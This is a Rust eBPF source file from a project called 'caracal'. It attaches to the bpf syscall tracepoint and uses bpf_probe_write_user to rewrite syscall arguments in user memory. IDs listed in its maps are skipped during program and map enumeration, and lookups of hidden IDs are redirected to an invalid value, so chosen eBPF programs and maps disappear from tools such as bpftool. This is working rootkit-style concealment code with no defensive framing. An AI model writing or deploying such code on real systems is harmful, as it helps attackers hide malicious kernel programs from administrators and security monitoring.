use aya_ebpf::{
    bindings::{bpf_attr, bpf_cmd},
    helpers::{bpf_probe_read, bpf_probe_write_user},
    macros::{map, tracepoint},
    maps::HashMap,
    programs::TracePointContext,
};
use aya_log_ebpf::debug;
use caracal_common::MAX_BPF_OBJ;

#[map]
static PROG_SKIP: HashMap<u32, u32> = HashMap::<u32, u32>::with_max_entries(MAX_BPF_OBJ, 0);
#[map]
static MAP_SKIP: HashMap<u32, u32> = HashMap::<u32, u32>::with_max_entries(MAX_BPF_OBJ, 0);
#[map]
static HIDDEN_BPF_OBJ: HashMap<u32, [u32; 32]> =
    HashMap::<u32, [u32; MAX_BPF_OBJ as usize]>::with_max_entries(2, 0);

#[tracepoint]
pub fn caracal_bpf(ctx: TracePointContext) -> Result<u32, u32> {
    let cmd: u32 = unsafe { ctx.read_at(16).map_err(|_| 0u32)? };
    let mut_attr: *mut bpf_attr = unsafe { ctx.read_at(24).map_err(|_| 0u32)? };
    let mut attr_cpy: bpf_attr = unsafe { bpf_probe_read(mut_attr).map_err(|_| 1u32)? };
    match cmd {
        bpf_cmd::BPF_PROG_GET_NEXT_ID => {
            let prog_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.prog_id };
            if let Some(skip_id) = unsafe { PROG_SKIP.get(&prog_id) } {
                update_obj_id(BpfObjType::Prog, *skip_id, &mut attr_cpy, mut_attr)?;
                debug!(&ctx, "prog: {} -> {}", prog_id, *skip_id);
            }
        }
        bpf_cmd::BPF_MAP_GET_NEXT_ID => {
            let map_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.map_id };
            if let Some(skip_id) = unsafe { MAP_SKIP.get(&map_id) } {
                update_obj_id(BpfObjType::Map, *skip_id, &mut attr_cpy, mut_attr)?;
                debug!(&ctx, "map: {} -> {}", map_id, *skip_id);
            }
        }
        bpf_cmd::BPF_PROG_GET_FD_BY_ID => {
            let prog_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.prog_id };

            if let Some(hidden_progs) = unsafe { HIDDEN_BPF_OBJ.get(&0) } {
                if hidden_progs.contains(&prog_id) {
                    update_obj_id(BpfObjType::Prog, u32::MAX, &mut attr_cpy, mut_attr)?;
                    debug!(&ctx, "prog: {}-> max", prog_id);
                }
            }
        }
        bpf_cmd::BPF_MAP_GET_FD_BY_ID => {
            let map_id = unsafe { attr_cpy.__bindgen_anon_6.__bindgen_anon_1.map_id };

            if let Some(hidden_maps) = unsafe { HIDDEN_BPF_OBJ.get(&1) } {
                if hidden_maps.contains(&map_id) {
                    update_obj_id(BpfObjType::Map, u32::MAX, &mut attr_cpy, mut_attr)?;
                    debug!(&ctx, "map: {} -> max", map_id);
                }
            }
        }
        _ => {}
    };
    Ok(0)
}
enum BpfObjType {
    Prog,
    Map,
}
#[inline]
fn update_obj_id(
    obj_type: BpfObjType,
    update_value: u32,
    src_prog_attr: &mut bpf_attr,
    dst_prog_attr: *mut bpf_attr,
) -> Result<u32, u32> {
    match obj_type {
        BpfObjType::Prog => src_prog_attr.__bindgen_anon_6.__bindgen_anon_1.prog_id = update_value,
        BpfObjType::Map => src_prog_attr.__bindgen_anon_6.__bindgen_anon_1.map_id = update_value,
    }
    unsafe {
        bpf_probe_write_user(dst_prog_attr, src_prog_attr as *const bpf_attr).map_err(|_| 0u32)?
    };
    Ok(0)
}
